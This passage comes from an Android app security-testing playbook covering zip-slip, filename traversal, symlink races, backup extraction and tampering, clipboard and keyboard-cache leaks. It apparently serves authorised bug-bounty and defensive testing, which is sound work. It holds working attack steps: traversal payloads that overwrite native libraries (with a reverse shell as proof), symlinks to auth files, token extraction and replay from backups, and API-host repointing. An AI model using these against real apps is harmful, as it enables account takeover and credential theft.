| **Maps to** | `developer.android.com/about/versions/14/behavior-changes-14` (`ZipException` on `..`/leading `/`; `dalvik.system.ZipPathValidator.clearCallback()` opt-out); H1 #859469 (LINE, Medium 5.4, $475), H1 #1378889 (Slack, High 8.1, $3500) |

- **Test:** Any unzip routine that uses `ZipEntry.getName()` as a path writes outside the target directory
  when an entry contains `..` or a leading `/`. Android 14 throws by default — but there is a documented
  opt-out, `dalvik.system.ZipPathValidator.clearCallback()`, whose presence re-enables zip-slip for the
  whole process.
- **How:**
```bash
grep -rn 'ZipPathValidator\|clearCallback' out/sources/
grep -rn 'ZipInputStream\|ZipFile\|getNextEntry' out/sources/ -A6 | grep -nE 'getName\(\)|new File\('
python3 - <<'PY'
import zipfile
z = zipfile.ZipFile('evil.zip','w')
z.writestr('../../../../data/data/com.target.app/shared_prefs/evil.xml','<map/>')
z.close()
PY
adb push evil.zip /sdcard/Download/
# feed it through the app's import/update feature, then:
adb shell run-as $PKG ls shared_prefs/
```
- **Proof:** With `clearCallback()` present (or targetSdk < 34), the file lands outside the intended
  directory — `run-as ls shared_prefs/` shows `evil.xml`. Without it, a `ZipException`. Note the LINE case:
  the app crashed with a `SecurityException` *after* the write had already landed — record that in the
  report so the crash is not mistaken for a failed exploit.
- **Escalation:** -> D11-024 (write a `.db-journal`), -> D11-020 (write a `.xml.bak`), -> D17 (drop a `.so`
  into `lib-*/`), -> the Slack shape (overwrite a config holding the API base URL and collect the tokens
  the app then sends).
- **Ruled out when:** targetSdk >= 34 and no `ZipPathValidator.clearCallback()` appears anywhere, or the
  extractor canonicalises each entry path and rejects any that escapes the target directory — show the
  `ZipException` or the rejected entry.

### D11-048 · `Content-Disposition` / provider `_display_name` filename traversal on download

| | |
|---|---|
| **Severity ceiling** | Critical — 2-click RCE when the file lands on a loaded `.so`/config path |
| **VRT** | outcome-rated: `server_side_injection.file_inclusion.local` (P1) analogue |
| **Attacker** | AM-02 remote one-click (no malicious app needed) |
| **Applies to** | any download/save path that takes the filename from a server header or a `content://` provider without sanitising it |
| **Maps to** | H1 #1377748 (Evernote, High, "2 click Remote Code execution"), H1 #1362313 (Evernote sibling, `_display_name` from a `content://` provider); H1 #288955 (IRCCloud, High) for the `getLastPathSegment()` percent-decode variant |

- **Test:** Download code that takes the filename from the server's `Content-Disposition` header, or from a
  `content://` provider's `_display_name`, without sanitising `..`. This is the *remote* traversal — no
  installed attacker app required. A related variant: `Uri.getLastPathSegment()` **decodes**
  percent-encoding, so `..%2F..%2F` survives a string check and becomes a real path at the `File`
  constructor.
- **How:**
```
Content-Disposition: attachment; filename="../../../lib-1/libjnigraphics.so"
```
```bash
grep -rnE 'Content-Disposition|getLastPathSegment\(\)|OpenableColumns|DISPLAY_NAME|guessFileName|getHeaderField\("Content-Disposition"' out/sources/
```
  Evernote #1377748: the attacker set the name via the product's own attachment-rename feature (special
  characters not restricted), shared the note, and the victim's download wrote to
  `/data/data/com.evernote/lib-1/libjnigraphics.so` instead of the intended cache path. Note the download
  logic was React Native compiled to Hermes bytecode, so the bug was found black-box by observing where the
  file landed — an un-decompilable bundle does not mean an untestable path.
- **Proof:** From an adb shell after the victim reopens the app, a reverse shell your planted `.so` spawned
  (`nc 127.0.0.1 <port>`); or, less, the file present at the traversed destination
  (`adb shell run-as $PKG cat <overwritten path>`).
- **Escalation:** -> D16/D17 (native library overwrite -> code execution); -> D11-020/-024 for the
  create-only variants.
- **Ruled out when:** The download path derives the filename from a server-controlled id it generates
  itself (not the header, not `_display_name`), or it sanitises `..` and rejects absolute paths after
  percent-decoding. Show the sanitiser running on `../` and on `..%2F`.

### D11-049 · TOCTOU / symlink race on a file handed over as `file://` or a descriptor

| | |
|---|---|
| **Severity ceiling** | High–Critical — arbitrary private-file read/write with the app's UID |
| **VRT** | outcome-rated: `server_side_injection.file_inclusion.local` (P1) analogue |
| **Attacker** | AM-03 (a symlink in a shared directory); AM-02 via a `file://` share |
| **Applies to** | all; the `StrictMode` LAX bypass defeats "we're on targetSdk 30, `file://` can't reach us" |
| **Maps to** | `developer.android.com/privacy-and-security/risks/content-resolver` (the five-step fstat/lstat validation algorithm; explicit mention of symlinks and race conditions); Oversecured "theft of arbitrary files" (`file://` vector, `FileUriExposedException` at targetSdk >= 18, and the `StrictMode.setVmPolicy(...LAX)` bypass); H1 #288955 (IRCCloud, symlink + `shared_prefs/prefs.xml` -> `session_key`) |

- **Test:** If the app validates a path *string* and then opens it later, swap the path for a symlink in
  between. Google's own guidance describes it directly: symlinks targeting app internal files, and "race
  conditions exploiting timing between security checks and file usage". The correct algorithm is to
  canonicalise, `fstat()` the descriptor, `lstat()` the canonical path, detect a remaining symlink, compare
  inode/device and block `/proc/` and `/data/misc/`. Look for validate-then-open on a *path* rather than
  validate-the-**descriptor**.
- **How:**
```bash
grep -rnE 'getCanonicalPath|canonicalFile|startsWith\(|openFileDescriptor|openInputStream|openAssetFileDescriptor|ParcelFileDescriptor\.open' out/sources/
# attacker side, in shared storage
ln -s /data/data/com.target.app/shared_prefs/auth.xml /sdcard/Download/benign.jpg
```
  The IRCCloud PoC combines the percent-decode escape with an owned symlink: create a deep path, symlink
  `shared_prefs/prefs.xml` into it, grant world permissions, and send a `file://` URI to the app's share
  chooser (requires `StrictMode.setVmPolicy(...build())` in the PoC to avoid `FileUriExposedException` on
  API 24+ — the *sender* controls that policy).
- **Proof:** The app reads or writes the symlink target — an upload whose body is the contents of `auth.xml`
  (containing `session_key`) captured in the proxy, or the file landing in a location you can read.
- **Escalation:** -> D13 (the stolen `session_key`), -> D07 (the same class through a provider), -> D08 (the
  `file://` delivery).
- **Ruled out when:** The app validates the open **descriptor** (fstat/lstat inode comparison) rather than
  the path string, or refuses `file://` inputs and only accepts `content://` with a resolver check. Show the
  symlink read failing.

### D11-050 · Data written to a hidden `.nomedia` directory the user cannot see or manage

| | |
|---|---|
| **Severity ceiling** | Medium — retained biometric/identity imagery the user cannot see (consent/GDPR) |
| **VRT** | `insecure_data_storage...on_external_storage` (P4) if world-readable; otherwise a privacy finding |
| **Attacker** | AM-11; AM-03 if the directory is world-readable |
| **Applies to** | apps that capture photos/video/screenshots (support tools, KYC, document scan) |
| **Maps to** | T1628.003 Conceal Multimedia Files (ATT&CK marks this "Do Not Mitigate" at platform level — `.nomedia` is legitimate, so it is a pure app-behaviour finding) |

- **Test:** If the app captures imagery and hides it from the Gallery with a `.nomedia` file or a
  dot-directory while retaining it, the user cannot see or manage data the product holds about them.
- **How:**
```bash
adb shell find /sdcard -name '.nomedia' -o -type d -name '.*' 2>/dev/null | head
grep -rnE '\.nomedia|MediaScannerConnection|MediaStore\.MediaColumns\.IS_PENDING' out/sources/
```
- **Proof:** A directory containing user-identifiable captures alongside a `.nomedia` marker, invisible in
  the Gallery but present on disk — show both the `ls` and the empty Gallery.
- **Escalation:** -> D20 (retention/consent); -> D11-041 if the directory is world-readable.
- **Ruled out when:** Captures are stored in the app's private directory (not `/sdcard`) or removed after
  upload, and no `.nomedia` conceals retained user imagery.

### D11-051 · Backup rules — read the RULES, then extract, never report the flag

| | |
|---|---|
| **Severity ceiling** | High when a session token or PII file is restorable; the flag alone is P5 |
| **VRT** | `mobile_security_misconfiguration.auto_backup_allowed_by_default` (**P5**) for the flag; file the extracted-and-replayed credential instead |
| **Attacker** | AM-11 physical unlocked with ADB; AM-11 with the user's backup account |
| **Applies to** | all; `dataExtractionRules` is the targetSdk 31+ form, `fullBackupContent` the pre-31 form — an app targeting 12+ needs both |
| **Maps to** | MASTG-TEST-0009, MASTG-TEST-0216, MASTG-TEST-0262, MASTG-TECH-0127, MASTG-TECH-0128, MASWE-0006, MASTG-KNOW-0050, MASTG-BEST-0004; VRT `auto_backup_allowed_by_default` (P5); H1 #1225158 (Zivver, $0 — the flag was the whole report) |

- **Test:** `allowBackup="true"` (or unset, which defaults true) is **not** a finding. Auto Backup always
  *excludes* `getCacheDir()`, `getCodeCacheDir()` and `getNoBackupFilesDir()`; everything else under
  `getFilesDir()`, `getDir()`, `getDatabasePath()` and `getExternalFilesDir()` is backed up unless a rule
  excludes it. Read the referenced XML and check whether `databases/` and `shared_prefs/` are actually
  excluded; then extract and prove which secret came out.
- **How:**
```bash
grep -nE 'allowBackup|fullBackupContent|dataExtractionRules|backupAgent|fullBackupOnly' out/AndroidManifest.xml
cat out/res/xml/*backup*.xml out/res/xml/*extraction*.xml 2>/dev/null
# modern extraction — bmgr local transport, no debuggable flag needed (MASTG-TECH-0128)
adb shell bmgr enable true
adb shell bmgr transport com.android.localtransport/.LocalTransport
adb shell bmgr backupnow $PKG
adb root && adb pull /data/data/com.android.localtransport/files/1/_full/$PKG $PKG.ab
tar xvf $PKG.ab && grep -REi 'token|bearer|refresh|password|secret' apps/$PKG/
# legacy path (LEGACY ≤ A11): 24-byte header + zlib(tar)
adb backup -f app.ab -noapk $PKG
python3 -c "import zlib,sys;sys.stdout.buffer.write(zlib.decompress(open('app.ab','rb').read()[24:]))" > app.tar
pax -r < app.tar   # star -x also works; GNU tar and 7-Zip FAIL (abe writes dir entries with no trailing slash)
```
  Archive layout `apps/<pkg>/`: `sp/` = SharedPreferences XML (**read FIRST** — auth tokens, PINs,
  `entryCode`, refresh tokens), `db/` = SQLite, `f/` = `getFilesDir()`, `r/` = root-dir files, `c/` = cache
  (not stored), `_manifest`.
- **Proof:** A `sp/` or `db/` entry containing a token, plus a successful replay of that token against the
  production API. **A failed or empty backup is a platform property, not an app property — evidence in
  neither direction.**
- **Escalation:** -> D11-053 (modify-and-restore); -> D13 (restored token authenticates on an attacker
  device = ATO); -> the macOS trap: LibreSSL has no `openssl zlib` subcommand, so the failure reads like a
  corrupt archive — use the Python `zlib.decompress` above.
- **Ruled out when:** The rules explicitly `<exclude>` `databases/` and `shared_prefs/` (worked example:
  Meesho stored tokens plaintext but `allowBackup=false` + `dataExtractionRules` excluded everything -> no
  backup theft) **and** an actual `bmgr backupnow` archive contains none of them. "The rules file exists" is
  not the negative; the extracted archive with nothing sensitive in it is.

### D11-052 · Asymmetric `dataExtractionRules` — excluded from cloud, wide open to device transfer

| | |
|---|---|
| **Severity ceiling** | High — D2D transfer is the one backup mode nobody tests, reachable in resale/repair/coerced-migration |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5) for the store; escalates via `broken_authentication_and_session_management.authentication_bypass` (P1) on restore |
| **Attacker** | AM-11 physical (device resale, repair shop, coerced migration) |
| **Applies to** | targetSdk >= 31; check the pre-31 `fullBackupContent` too |
| **Maps to** | `developer.android.com/guide/topics/data/autobackup` (the `<cloud-backup>` / `<device-transfer>` schema and the rule that a missing section means fully enabled); `developer.android.com/guide/topics/data/testingbackup`; MASWE-0006, MASTG-TEST-0009 |

- **Test:** Android 12+ `dataExtractionRules` splits `<cloud-backup>` from `<device-transfer>`, and **if a
  section is missing, that mode is fully enabled** for all content except `no-backup` and `cache`. A very
  common pattern excludes a secrets file from `<cloud-backup>` while leaving `<device-transfer>` untouched —
  or ships only a `<cloud-backup>` section, so device transfer has *no* restrictions at all. Also note
  `android:allowBackup="false"` "may not disable D2D on some devices" per the docs.
- **How:**
```bash
grep -nE 'android:dataExtractionRules|android:fullBackupContent|android:allowBackup|android:backupAgent' out/AndroidManifest.xml
cat out/res/xml/*extraction*.xml out/res/xml/*backup*.xml 2>/dev/null
# exercise the D2D path explicitly
adb shell settings put secure backup_enable_d2d_test_mode 1
adb shell bmgr transport com.google.android.gms/.backup.migrate.service.D2dTransport
adb shell bmgr init com.google.android.gms/.backup.migrate.service.D2dTransport
adb shell bmgr backupnow $PKG
adb shell dumpsys backup
# reset
adb shell settings put secure backup_enable_d2d_test_mode 0
adb shell bmgr transport com.google.android.gms/.backup.BackupTransportService
```
- **Proof:** A secrets file (token, key material, PIN hash, device-binding record) present in the
  device-transfer set but absent from the cloud set — or an XML with only `<cloud-backup>` present. Show the
  `dumpsys backup` output listing the package's set under the D2D transport.
- **Escalation:** Restored token -> D11-054 (device-bound restore guard), -> D13 ATO on the receiving
  device.
- **Ruled out when:** **Both** `<cloud-backup>` and `<device-transfer>` explicitly exclude every path
  holding credentials/PII, verified by a `bmgr backupnow` D2D archive that contains none, and the pre-31
  `fullBackupContent` matches. A correct new file plus a permissive legacy file still leaks on Android 11
  devices — check the older file too.

### D11-053 · Modify-and-restore — prove a client-side entitlement/PIN is authoritative

| | |
|---|---|
| **Severity ceiling** | High — client-side authorisation bypass with a concrete demonstration |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) for a PIN/gate flip; business-logic node for entitlement |
| **Attacker** | AM-11 physical unlocked |
| **Applies to** | same `[DEGRADED ≤A11 / bmgr on 12+]` gating as D11-051 |
| **Maps to** | MASTG-TECH-0128; MASWE-0006 |

- **Test:** Flip a value in the backup set and restore it, then show the app honouring the tampered value.
  For the legacy `adb` archive the file order must be preserved or the restore is rejected; for the modern
  path, write the modified value into the local-transport backup set and reinstall.
- **How:**
```bash
# legacy: preserve order
tar -tf app.tar > app.list
# ...edit files in place...
star -c -v -f new.tar -no-dirslash list=app.list
java -jar abe.jar pack-kk new.tar new.ab          # pack-kk for 4.4.3+; 'pack' for older
adb restore new.ab
# modern (non-debuggable): edit in the local-transport set, then reinstall
adb shell run-as $PKG cat shared_prefs/config.xml > config.xml   # edit it
adb shell run-as $PKG cp /sdcard/config.xml shared_prefs/config.xml
adb shell pm uninstall --user 0 $PKG && adb install-multiple -t --user 0 base.apk split_*.apk
```
- **Proof:** A screen recording of the app after restore showing the entitlement/PIN state you wrote (the
  gated screen opening, the premium tier live), with no server round-trip that corrects it.
- **Escalation:** The same mechanism plants a control-plane value (D11-056); -> D23 entitlement; -> D13 for
  a restored biometric-lock boolean (J13).
- **Ruled out when:** Restoring the tampered value changes nothing because the app re-derives it from the
  server on next launch — prove it by restoring and showing the app overwriting or ignoring your edit. A
  header-only `.ab` on a modern device is not this negative; use the `bmgr` route.

### D11-054 · Inverted or absent restore guard on a device-bound value

| | |
|---|---|
| **Severity ceiling** | Critical — credential portability from a backup file = account takeover |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-11 physical unlocked (a backup file plus an attacker device/emulator) |
| **Applies to** | all apps that persist a device-bound secret and set `allowBackup` effectively true |
| **Maps to** | `developer.android.com/guide/topics/data/autobackup` (`onRestoreFinished()` semantics; restore occurs before first launch); MASWE-0006, MASWE-0024 |

- **Test:** Apps that must not restore a device-bound secret usually store an identifier
  (`Settings.Secure.ANDROID_ID`, an install UUID, a Keystore-attested alias) alongside it and discard the
  secret when the identifier does not match on next launch. Three failure shapes: **(a)** the comparison is
  inverted (`if (stored.equals(current)) wipe();` — so a *foreign* device is exactly the case that keeps the
  secret); **(b)** the guard runs in `onRestoreFinished()` but the secret is read earlier by an App Startup
  initializer; **(c)** the guard compares a value that is itself restored, so it always matches. The
  `android_id`-equality check is a same-device heuristic, not authentication, and it is *frequently inverted*.
- **How:**
```bash
grep -rnE 'ANDROID_ID|Settings\.Secure\.getString|onRestoreFinished|BackupAgent|onRestore\(|getSerial|installUuid|device_id' out/sources/ -A6
# capture backup on device A, restore onto device B (different ANDROID_ID) via D2D between two emulators
adb -s A shell bmgr transport com.android.localtransport/.LocalTransport
adb -s A shell bmgr backupnow $PKG
adb -s B shell pm uninstall --user 0 $PKG && adb -s B install base.apk
adb -s B logcat -s TargetApp | grep -iE 'restore|device id|mismatch'
```
- **Proof:** Device B making an authenticated request with device A's session, captured in the proxy —
  confirmed if B's app authenticates or decrypts with A's secret; refuted if it wipes. Show both the guard's
  code and the differential two-device run. **Mark HYPOTHESIS in the report until the two-device experiment
  runs.**
- **Escalation:** -> D13 (portable credential = ATO); -> D11-056 (the same restore path plants control-plane
  values).
- **Ruled out when:** The two-device restore wipes the secret on the receiving device (the guard fires
  correctly and is not inverted), and the guard runs before any initializer reads the secret. The
  two-device run is mandatory — a code read alone cannot rule this out because the inversion is easy to
  misread.

### D11-055 · The session token written a SECOND time, in plaintext, backup-reachable

| | |
|---|---|
| **Severity ceiling** | Medium–High — storage finding and the payload for the D08 exfil chain |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5); file the replay/restore outcome |
| **Attacker** | AM-11 (backup); AM-03 via FileProvider self-grant |
| **Applies to** | all; acute where the app ships a custom `BackupAgent` |
| **Maps to** | MASWE-0006; `onFullBackup` / `FullBackupDataOutput` |

- **Test:** Apps frequently duplicate the session into a plain file — e.g. `files/session_backup_payload`
  written by the app's own backup agent — that is included in cloud backup and device transfer even though
  the primary token store is excluded. That second copy is also reachable by a FileProvider self-grant where
  `shared_prefs` is not.
- **How:**
```bash
grep -rn 'BackupAgent\|onFullBackup\|FullBackupDataOutput\|onRestore' out/sources/
adb shell run-as $PKG find files -type f -newer shared_prefs
strings pulled/files/* | grep -iE 'eyJ|bearer|access_token|refresh'
```
- **Proof:** The plain JSON file contents showing the token **plus** the identity (name, phone, email,
  user_id, wallet), and its path under a backed-up domain.
- **Escalation:** -> D08 (FileProvider self-grant reaches this file even though `shared_prefs` is not
  exported); -> D13 (replay); -> D11-051 (it comes out in the backup).
- **Ruled out when:** No secondary plaintext copy of the session exists (the `find` after login turns up
  nothing new outside the encrypted store), or the custom `BackupAgent` excludes it. State the `find`
  result.

### D11-056 · Restorable control-plane values — the highest-ceiling item in the chapter

| | |
|---|---|
| **Severity ceiling** | Critical when the restored value is the API host or the pin set; High for feature flags and trust caches |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) via the credential-capture outcome; the pinning bypass is a D14 join |
| **Attacker** | AM-11 physical unlocked |
| **Applies to** | all apps with `allowBackup` effectively true that read config from storage |
| **Maps to** | `developer.android.com/privacy-and-security/risks/backup-best-practices`; MASWE-0006, MASWE-0050; restore semantics ("Restore happens after APK installation but before user can launch app") |

- **Test:** The high-value inversion of "is my token backed up". Look for values in backed-up storage the
  app *trusts on next launch* rather than merely reads: API base URL / host map, remote-config cache,
  feature flags, certificate-pin set, `is_rooted`/`device_trusted` cache, `onboarding_complete`, kill-switch
  state, A/B assignment, biometric-lock boolean. Restoring an attacker-authored copy reconfigures or
  repoints the app **before it ever contacts the server** — restore lands after install but before first
  launch.
- **How:**
```bash
adb shell bmgr transport com.android.localtransport/.LocalTransport && adb shell bmgr backupnow $PKG
adb shell run-as $PKG find . -name '*.xml' -o -name '*.json' -o -name '*.db' 2>/dev/null
grep -rnE 'BASE_URL|baseUrl|api_host|endpoint|remote_config|firebase_remote|feature_flag|flags\.json|pin_set|cert_pins|kill_switch|is_rooted|device_trusted|onboarding_complete' out/sources/
# trace each control-plane key back to storage, confirm it is in the backup set, then modify+restore
adb shell run-as $PKG cat shared_prefs/config.xml > config.xml   # edit host, then:
adb shell run-as $PKG cp /sdcard/config.xml shared_prefs/config.xml
adb shell am force-stop $PKG && adb shell monkey -p $PKG 1
```
- **Proof:** The app's first outbound request after restore goes to the attacker-chosen host (proxy log), or
  a gated feature is live without the server ever enabling it. For the pinning case, the pinning interceptor
  does not reject the attacker host because the pin set was restored too.
- **Escalation:** -> J01 (backup rules × network interceptor: a restored host or pin set = pre-auth MitM of a
  pinned app, D14); -> J12 (App Startup initializer reads the restored value before any gate, D18); -> J13
  (biometric-lock boolean restored false, D13); -> J18 (entitlement, D23). Host repoint -> credential
  capture on first launch -> ATO.
- **Ruled out when:** Every control-plane value is fetched from the server on launch and the restored cache
  is overwritten before the first request (show the app ignoring your edited host), or all such keys are
  excluded from both backup sections and signed. The specific test is: restore an attacker host, launch,
  and watch the first request's destination.

### D11-057 · SDK-written files included in the backup set

| | |
|---|---|
| **Severity ceiling** | Medium–High depending on the SDK token's power and whether the app is regulated |
| **VRT** | `insecure_data_storage...on_internal_storage` (P5); file the extracted-and-replayed token |
| **Attacker** | AM-11 physical unlocked with ADB |
| **Applies to** | all apps embedding SDKs; `allowBackup` defaults true unless set false |
| **Maps to** | MASWE-0006; mechanism |

- **Test:** If `allowBackup` is not false, SDK-written token files leave the device in cloud/adb/D2D backups
  unless the app's rules explicitly exclude the SDK's paths — which they rarely do, because the app team did
  not know the SDK wrote them (D11-028).
- **How:**
```bash
grep -nE 'allowBackup|fullBackupContent|dataExtractionRules' out/AndroidManifest.xml
cat out/res/xml/backup_rules*.xml out/res/xml/data_extraction_rules*.xml 2>/dev/null
adb shell bmgr transport com.android.localtransport/.LocalTransport && adb shell bmgr backupnow $PKG
adb root && tar xf /data/data/com.android.localtransport/files/1/_full/$PKG -C loot 2>/dev/null
grep -REi 'shared_prefs|databases' loot/ | grep -iE 'token|refresh|session'
```
- **Proof:** A token-bearing SDK file present inside the extracted backup tree, plus a replay.
- **Escalation:** -> D11-028 (the SDK token itself), -> D13/D15 (replay).
- **Ruled out when:** The rules exclude the SDK's specific paths (verify against the SDK's known filenames,
  not just `shared_prefs/` and `databases/`) and the extracted archive contains none. A generic exclusion of
  `shared_prefs/` misses an SDK that writes to `files/`.

### D11-058 · Build the backup/restore rig once — then every backup item is routine

| | |
|---|---|
| **Severity ceiling** | Support (technique) |
| **VRT** | n/a |
| **Attacker** | n/a |
| **Applies to** | all |
| **Maps to** | `developer.android.com/guide/topics/data/testingbackup` (every command below is quoted from that page) |

- **Test:** Most teams never test backup because the rig is fiddly, so they silently skip the highest-ceiling
  storage items. Stand it up once. Note Android 12 excludes app data from `adb backup` unless
  `android:debuggable="true"`, so `adb backup` is **LEGACY** as an extraction technique and `bmgr` + the
  local/D2D transport is the current one.
- **How:**
```bash
# cloud path
adb shell bmgr enable true
adb shell bmgr list transports
adb shell bmgr transport com.android.localtransport/.LocalTransport
adb shell settings put secure backup_local_transport_parameters 'is_encrypted=true'
adb shell bmgr backupnow $PKG
adb shell dumpsys backup
# device-to-device path
adb shell settings put secure backup_enable_d2d_test_mode 1
adb shell bmgr transport com.google.android.gms/.backup.migrate.service.D2dTransport
adb shell bmgr init com.google.android.gms/.backup.migrate.service.D2dTransport
adb shell bmgr backupnow $PKG
# restore-on-install
adb shell pm uninstall --user 0 $PKG
adb install-multiple -t --user 0 base.apk split_*.apk
# reset
adb shell settings put secure backup_enable_d2d_test_mode 0
adb shell bmgr transport com.google.android.gms/.backup.BackupTransportService
```
- **Proof:** `dumpsys backup` showing the package's backup set and the transport in use.
- **Escalation:** Feeds D11-051 through D11-057 and the J01/J12/J13/J18 joins.
- **Ruled out when:** n/a — this is the harness, not a finding.

### D11-059 · Sensitive value placed on the system clipboard without `EXTRA_IS_SENSITIVE`

| | |
|---|---|
| **Severity ceiling** | Low (P5) standalone; Medium only for an OTP/PAN/seed-phrase with a concrete cross-app read on the supported OS |
| **VRT** | `mobile_security_misconfiguration.clipboard_enabled` (**P5**, baseline `AV:L/AC:H/PR:N/UI:R/S:C/C:L/I:N/A:N`); `external_behavior.system_clipboard_leak.shared_links` (P5) |
| **Attacker** | AM-04 foreground app / IME / accessibility service (post-29); AM-03 background read (**LEGACY** < 29) |
| **Applies to** | all; the VRT flattened the sensitive/non-sensitive children into one P5 parent — it will not entertain a "but it was sensitive content" argument on category grounds |
| **Maps to** | MASWE-0030 (CWE-200, CWE-668); MASTG-KNOW (clipboard); VRT `clipboard_enabled` (P5); `ClipDescription.EXTRA_IS_SENSITIVE` (API 33+; string key `"android.content.extra.IS_SENSITIVE"` on 32 and below) |

- **Test:** An app that copies (or lets the user copy) a password, OTP, card number, recovery phrase or
  token to the clipboard exposes it. This is P5 and will close on category grounds alone — report only with
  a genuine authentication secret and a demonstrated read on the in-scope OS. From Android 10 background
  apps cannot read the clipboard; from Android 12 a toast appears on read; from Android 13 a preview renders
  the content and the `EXTRA_IS_SENSITIVE` flag suppresses it. The **absence of that flag** is the
  developer-side defect to name.
- **How:**
```bash
grep -rnE 'ClipboardManager|setPrimaryClip|ClipData\.newPlainText|EXTRA_IS_SENSITIVE|OnPrimaryClipChangedListener' out/sources/
grep -rn 'EXTRA_IS_SENSITIVE\|android.content.extra.IS_SENSITIVE' out/sources/   # absence is the finding
adb shell service call clipboard 1 s16 com.attacker 2>/dev/null | head          # read attempt (OEM/API-varying)
```
```javascript
Java.perform(function () {
  var CM = Java.use('android.content.ClipboardManager');
  CM.setPrimaryClip.implementation = function (c) {
    var d = c.getDescription();
    console.log('[clip] ' + c.getItemAt(0).getText() + ' extras=' + d.getExtras());
    return this.setPrimaryClip(c);
  };
});
```
  Reliable read is from a **foreground** PoC app on API 29+:
```java
ClipboardManager cm=(ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
Log.e("PoC", cm.getPrimaryClip().getItemAt(0).getText().toString());
```
- **Proof:** The foreground PoC app's logcat printing the OTP/PAN/seed, **and** the hook output showing
  `extras=null` (no `IS_SENSITIVE`) for that clip. State the API level you demonstrated on.
- **Escalation:** Only via D13 — if the clipboard item is an OTP you then use to complete authentication,
  file the ATO, not the clipboard; -> J14 (keyboard clipboard history persists the value beyond app
  lifetime); -> D23 for a PAN; wallet seed -> wallet drain.
- **Ruled out when:** The app sets `EXTRA_IS_SENSITIVE` on the clip and the target OS is 29+ (background read
  blocked), so no realistic cross-app read exists — or the copied value is not an authentication secret.
  Note `UI:R` and `C:L` in the baseline vector: it is *designed* to score low.

### D11-060 · Clipboard READ of another app's clip, shipped off-device

| | |
|---|---|
| **Severity ceiling** | High when transmitted clipboard contents are a password-manager paste or a 2FA code |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) for the transmission; the read itself is P5 |
| **Attacker** | the target app is the reader here — this is the app misbehaving, tested from the defender's side |
| **Applies to** | Android 12+ (the toast makes a silent-launch read detectable) |
| **Maps to** | `developer.android.com/about/versions/12/behavior-changes-all` (toast `"APP pasted from your clipboard."`; `getPrimaryClipDescription()` does not trigger it) |

- **Test:** Since Android 12 the first `getPrimaryClip()` against another app's clip raises a toast. An app
  that silently reads the clipboard on launch is now detectable — and if it ships the contents off-device,
  that is a concrete exfil finding against the app itself.
- **How:**
```bash
adb logcat -c
adb shell monkey -p $PKG 1     # cold launch; watch for the toast on-device
```
```javascript
Java.perform(function () {
  var CM = Java.use('android.content.ClipboardManager');
  CM.getPrimaryClip.implementation = function () {
    var c = this.getPrimaryClip();
    console.log('[clipread] ' + (c ? c.getItemAt(0).coerceToText(
      Java.use('android.app.ActivityThread').currentApplication().getApplicationContext()) : 'null'));
    return c;
  };
});
```
- **Proof:** The toast observed at app launch + the hook output + the same string appearing in a Burp
  request body leaving the device.
- **Escalation:** -> D20/D13 (the transmitted 2FA code or password-manager paste).
- **Ruled out when:** The app never calls `getPrimaryClip` on launch (only `getPrimaryClipDescription`, which
  is legitimate for enabling a paste button), or the read result never leaves the device. Show the hook not
  firing on cold launch.

### D11-061 · Keyboard cache on sensitive input fields

| | |
|---|---|
| **Severity ceiling** | Low–Medium; Medium for a PIN, OTP, card number or seed phrase |
| **VRT** | outcome-rated; MASWE-0036, CWE-524. No dedicated VRT node — argue Medium for a payment/auth credential |
| **Attacker** | AM-05 (the cached suggestion surfaces in any app on the shared device); AM-04 (malicious IME) |
| **Applies to** | all; Jetpack Compose uses `KeyboardOptions` / `SecureTextField` |
| **Maps to** | MASTG-TEST-0258, MASTG-TEST-0316, MASWE-0036, MASTG-KNOW-0055, MASTG-BEST-0019, LEGACY-ID MASTG-TEST-0006 (deprecated); mobsfscan `android_sensitive_input_keyboard_cache` |

- **Test:** A field that is not a non-caching input type has its contents learned by the IME dictionary and
  re-offered as a suggestion — including in other apps. The mobsfscan rule is exact: a field name matching
  `(?i).*(password|passcode|pin|secret|otp|token).*` combined with an `inputType` lacking
  `TYPE_TEXT_VARIATION_PASSWORD | TYPE_TEXT_VARIATION_VISIBLE_PASSWORD | TYPE_NUMBER_VARIATION_PASSWORD |
  TYPE_TEXT_FLAG_NO_SUGGESTIONS`.
- **How:**
```bash
grep -rn 'android:inputType' out/res/layout/ | grep -viE 'textPassword|textVisiblePassword|textWebPassword|numberPassword|textNoSuggestions'
grep -rnE 'setInputType\(|KeyboardOptions\(|keyboardType\s*=|SecureTextField|TextObfuscationMode|IME_FLAG_NO_PERSONALIZED_LEARNING' out/sources/
# rooted confirmation of the IME dictionary
adb shell ls -l /data/data/com.google.android.inputmethod.latin/databases/ 2>/dev/null
```
- **Proof:** Type a unique canary into the app's sensitive field, then open any other app's text box and
  show the IME suggesting the canary — screen-record it — plus the offending `inputType`/`KeyboardOptions`
  declaration.
- **Escalation:** Cached OTP/PAN recovered from a shared device -> D13/D23. Note MASTG-TEST-0316's caveat:
  even a Compose `SecureTextField` defaulting to `RevealLastTyped` "can later be changed to `Visible`
  programmatically" — grep for that.
- **Ruled out when:** Every sensitive field is `textPassword`/`numberPassword`/`textNoSuggestions` (or the
  Compose equivalent), verified by the canary **not** appearing as a suggestion in a second app. State the
  false-negative risk with custom UI frameworks and game engines (MASTG-TEST-0316's own caveat).

### D11-062 · Sensitive data written to logcat — name the reader or it is informational

| | |
|---|---|
| **Severity ceiling** | Medium local-only on a modern device; High when written to shared storage or shipped by a crash/analytics SDK |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets` (VARIES); the base observation is not a finding |
| **Attacker** | AM-04 (a `READ_LOGS`-holding OEM preload); AM-08 (a log-shipping SDK); AM-11 (ADB) |
| **Applies to** | Cross-app `READ_LOGS` is **LEGACY (pre-Android 4.1)** for ordinary apps — state the reader |
| **Maps to** | MASTG-TEST-0203, MASTG-TEST-0231, MASWE-0005 (CWE-532); T1533; also MASTG-TEST-0263/0264/0265 (StrictMode left on in production, MASWE-0061) |

- **Test:** "The app logs to logcat" is not a finding — since Android 4.1 apps read only their own logs. It
  becomes a finding when the logged secret is reachable by another principal: a privileged OEM preload with
  `READ_LOGS`, a crash/analytics SDK that uploads breadcrumbs, a value additionally written to a
